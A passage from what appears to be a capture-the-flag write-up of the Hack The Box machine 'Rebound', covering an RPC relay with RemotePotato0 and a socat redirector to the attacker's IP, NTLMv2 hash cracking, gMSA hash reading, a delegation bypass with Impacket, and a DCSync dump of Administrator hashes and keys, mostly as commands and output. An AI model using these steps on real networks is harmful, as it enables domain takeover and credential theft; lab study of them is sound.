[CoGetInstanceFromIstorage](https://learn.microsoft.com/en-us/windows/win32/api/objbase/nf-objbase-cogetinstancefromistorage) with a CLSID that can impersonate an interactive user in parameter and setting the attacker IP for OXID resolution. Thereafter, the exploit works in the same way as [RottenPotato](https://github.com/foxglovesec/RottenPotato):

![remotepotato_schema](/assets/posts/2023-09-19-htb-rebound/remotepotato_schema.png)

We setup network redirector to implement MiTM, we will receive [IObjectExporter::ResolveOxid2](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/65292e10-ef0c-43ee-bce7-788e271cc794) call and will send fake OXID resolver:

```bash
❯ sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.10.11.231:9999
```

Run RemotePotato exploit in the server to get user logged on machine (tbrady):

```bash
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> .\RemotePotato0.exe -m 2 -x 10.10.14.113 -p 9999 -s 1
[*] Detected a Windows Server version not compatible with JuicyPotato. RogueOxidResolver must be run remotely. Remember to forward tcp port 135 on (null) to your victim machine on port 9999
[*] Example Network redirector:
    sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:{{ThisMachineIp}}:9999
[*] Starting the RPC server to capture the credentials hash from the user authentication!!
[*] RPC relay server listening on port 9997 ...
[*] Spawning COM object in the session: 1
[*] Calling StandardGetInstanceFromIStorage with CLSID:{5167B42F-C111-47A1-ACC4-8EABE61B0B54}
[*] Starting RogueOxidResolver RPC Server listening on port 9999 ...
[*] IStoragetrigger written: 106 bytes
[*] ServerAlive2 RPC Call
[*] ResolveOxid2 RPC call
[+] Received the relayed authentication on the RPC relay server on port 9997
[*] Connected to RPC Server 127.0.0.1 on port 9999
[+] User hash stolen!

NTLMv2 Client    : DC01
NTLMv2 Username    : rebound\tbrady
NTLMv2 Hash    : tbrady::rebound:57ab4704b5bbbe5d:4b5afd7daf48aef4acf303a117cd09cb:01010000000000006e264fdfeee4d90186ecdee2f934db2a0000000002000e007200650062006f0075006e006400010008004400430030003100040016007200650062006f0075006e0064002e006800740062000300200064006300300031002e007200650062006f0075006e0064002e00680074006200050016007200650062006f0075006e0064002e00680074006200070008006e264fdfeee4d901060004000600000008003000300000000000000001000000002000009cd08b93efe4ef13777e963730c9de8db8ef04079fb0c74235ec5dad21b768340a00100000000000000000000000000000000000090000000000000000000000
```

Now we can crack tbrady's NTLMv2 hash:

```bash
❯ john tbrady.hash --wordlist=/opt/rockyou.txtUsing default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
543BOMBOMBUNmanda (tbrady)
1g 0:00:00:02 DONE (2023-09-11 15:31) 0g/s 4995Kp/s 4995Kc/s 4995KC/s 549217..543584
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

## Read GMSA password

Bloodhound enumeration shows that tbrady has `ReadGMSAPassword` privilege outbound to delegator$ machine account. Moreover, delegator$ account has `AllowedToDelegateTo` on the DC:

![bh_screen_gmsa_kcd](/assets/posts/2023-09-19-htb-rebound/bh_screen_gmsa_kcd.png)

It's significate that we can read the hash NT of gMSA delegator$ account:

```bash
❯ getTGT.py -dc-ip "dc01.rebound.htb" rebound.htb/'tbrady:543BOMBOMBUNmanda'
Impacket for Exegol - v0.10.1.dev1+20230806.34223.faf17b2 - Copyright 2022 Fortra - forked by ThePorgs

[*] Saving ticket in tbrady.ccache
❯ KRB5CCNAME=tbrady.ccache cme ldap rebound.htb -d rebound.htb --use-kcache
SMB         rebound.htb     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)
LDAPS       rebound.htb     636    DC01             [+] rebound.htb\tbrady
[Sep 11, 2023 - 15:48:13 (CEST)] exegol-ak /workspace # faketime '2023-09-11 22:47:09' cme ldap rebound.htb -d rebound.htb --use-kcache --gmsa
SMB         rebound.htb     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)
LDAP        rebound.htb     636    DC01             [+] rebound.htb\tbrady from ccache
LDAP        rebound.htb     636    DC01             [*] Getting GMSA Passwords
LDAP        rebound.htb     636    DC01             Account: delegator$           NTLM: 9b0ccb7d34c670b2a9c81c45bc8befc3
```

## Bypass Constrained Delegation restrictions with RBCD

With delegator$ machine account, it's possible to exploit constrained delegation (KCD) but Administrator domain user has restrictions:

![admin_cannot_be_delegated](/assets/posts/2023-09-19-htb-rebound/admin_cannot_be_delegated.png)

The "Account is sensitive and cannot be delegated" flag (`NOT_DELEGATED` value in `UserAccountControl`) ensures that an account’s credentials cannot be forwarded to other computers or services on the network by a trusted application.

However, delegator$ machine account has

![delegator_attributes](/assets/posts/2023-09-19-htb-rebound/delegator_attributes.png)

However, there is a technique that allows to bypass it with RBCD (Resource-based Constrained Delegation):

```bash
❯ getTGT.py -dc-ip "dc01.rebound.htb" rebound.htb/'delegator$' -hashes ':9b0ccb7d34c670b2a9c81c45bc8befc3'
Impacket for Exegol - v0.10.1.dev1+20230806.34223.faf17b2 - Copyright 2022 Fortra - forked by ThePorgs

[*] Saving ticket in delegator$.ccache
❯ export KRB5CCNAME=delegator\$.ccache
```

```bash
❯ rbcd.py 'rebound.htb/delegator$' -delegate-to 'delegator$' -delegate-from ldap_monitor -use-ldaps -action write -k -no-pass
Impacket for Exegol - v0.10.1.dev1+20230806.34223.faf17b2 - Copyright 2022 Fortra - forked by ThePorgs

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] ldap_monitor can now impersonate users on delegator$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     ldap_monitor   (S-1-5-21-4078382237-1492182817-2568127209-7681)
```

```bash
❯ getTGT.py -dc-ip "dc01.rebound.htb" "rebound.htb"/'ldap_monitor':'1GR8t@$$4u'
Impacket for Exegol - v0.10.1.dev1+20230806.34223.faf17b2 - Copyright 2022 Fortra - forked by ThePorgs

[*] Saving ticket in ldap_monitor.ccache
❯ export KRB5CCNAME=ldap_monitor.ccache
```

```bash
❯ getST.py -spn "browser/dc01.rebound.htb" -impersonate "dc01$" "rebound.htb/ldap_monitor" -k -no-pass
Impacket for Exegol - v0.10.1.dev1+20230806.34223.faf17b2 - Copyright 2022 Fortra - forked by ThePorgs

[*] Impersonating dc01$
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in dc01$@browser_dc01.rebound.htb@REBOUND.HTB.ccache
❯ export KRB5CCNAME=dc01\$@browser_dc01.rebound.htb@REBOUND.HTB.ccache
```

```bash
❯ getST.py -spn "http/dc01.rebound.htb" -impersonate "dc01$" -additional-ticket "dc01\$@browser_dc01.rebound.htb@REBOUND.HTB.ccache" "rebound.htb/delegator$" -aesKey 9861cac50c316fadde60e00ec4a3c63852afbe05443343cdb011be5f1d4ddc2b -k -no-pass
Impacket for Exegol - v0.10.1.dev1+20230806.34223.faf17b2 - Copyright 2022 Fortra - forked by ThePorgs

[*] Getting TGT for user
[*] Impersonating dc01$
[*] 	Using additional ticket dc01$@browser_dc01.rebound.htb@REBOUND.HTB.ccache instead of S4U2Self
[*] Requesting S4U2Proxy
[*] Saving ticket in dc01$@http_dc01.rebound.htb@REBOUND.HTB.ccache
❯ export KRB5CCNAME=dc01\$@http_dc01.rebound.htb@REBOUND.HTB.ccache
```

## DCSync

DCSync is a technique that impersonates a DC by simulating a replication process. [secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) tool is used to carry out this type of attack. It sends an [IDL_DRSGetNCChanges](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/b63730ac-614c-431c-9501-28d6aca91894) request to the DRSUAPI to replicate LDAP directory objects in a given naming context (NC), in order to retrieve Kerberos keys and the secrets contained in the NTDS.DIT database.

We can now retrieve the NT hashes of all domain accounts, as we have dcsync rights (DS-Replication-Get-Changes and DS-Replication-Get-Changes-All):

```bash
❯ secretsdump "rebound.htb"/'dc01$'@"dc01.rebound.htb" -k -no-pass -just-dc-user Administrator
Impacket for Exegol - v0.10.1.dev1+20230806.34223.faf17b2 - Copyright 2022 Fortra - forked by ThePorgs

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:176be138594933bb67db3b2572fc91b8:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:32fd2c37d71def86d7687c95c62395ffcbeaf13045d1779d6c0b95b056d5adb1
Administrator:aes128-cts-hmac-sha1-96:efc20229b67e032cba60e05a6c21431f
Administrator:des-cbc-md5:ad8ac2a825fe1080
[*] Cleaning up...
```

## Ressources

- [https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/rid-cycling](https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/rid-cycling)
- [https://www.thehacker.recipes/ad/movement/kerberos/kerberoast#kerberoast-w-o-pre-authentication](https://www.thehacker.recipes/ad/movement/kerberos/kerberoast#kerberoast-w-o-pre-authentication)
- [https://www.semperis.com/blog/new-attack-paths-as-requested-sts/](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/)
- [https://www.thehacker.recipes/ad/movement/dacl](https://www.thehacker.recipes/ad/movement/dacl)
- [https://github.com/fortra/impacket/pull/1413](https://github.com/fortra/impacket/pull/1413)
- [https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials](https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials)
- [https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)
- [https://www.thehacker.recipes/ad/movement/kerberos/unpac-the-hash](https://www.thehacker.recipes/ad/movement/kerberos/unpac-the-hash)
- [https://www.sentinelone.com/labs/relaying-potatoes-another-unexpected-privilege-escalation-vulnerability-in-windows-rpc-protocol/](https://www.thehacker.recipes/ad/movement/kerberos/unpac-the-hashhttps://www.sentinelone.com/labs/relaying-potatoes-another-unexpected-privilege-escalation-vulnerability-in-windows-rpc-protocol/)
- [https://hideandsec.sh/books/windows-sNL/page/in-the-potato-family-i-want-them-all#bkmrk-remotepotato](https://hideandsec.sh/books/windows-sNL/page/in-the-potato-family-i-want-them-all#bkmrk-remotepotato)
- [https://www.thehacker.recipes/a-d/movement/dacl/readgmsapassword](https://www.thehacker.recipes/a-d/movement/dacl/readgmsapassword)
- [https://www.thehacker.recipes/a-d/movement/kerberos/delegations/constrained#2.-additional-s4u2proxy](https://www.thehacker.recipes/a-d/movement/kerberos/delegations/constrained#2.-additional-s4u2proxy)
- [https://beta.hackndo.com/constrained-unconstrained-delegation/](https://beta.hackndo.com/constrained-unconstrained-delegation/)
- [https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/constrained-delegation](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/constrained-delegation)
- [https://hideandsec.sh/books/cheatsheets-82c/page/active-directory-python-edition#bkmrk-bypass-constrained-d](https://hideandsec.sh/books/cheatsheets-82c/page/active-directory-python-edition#bkmrk-bypass-constrained-d)
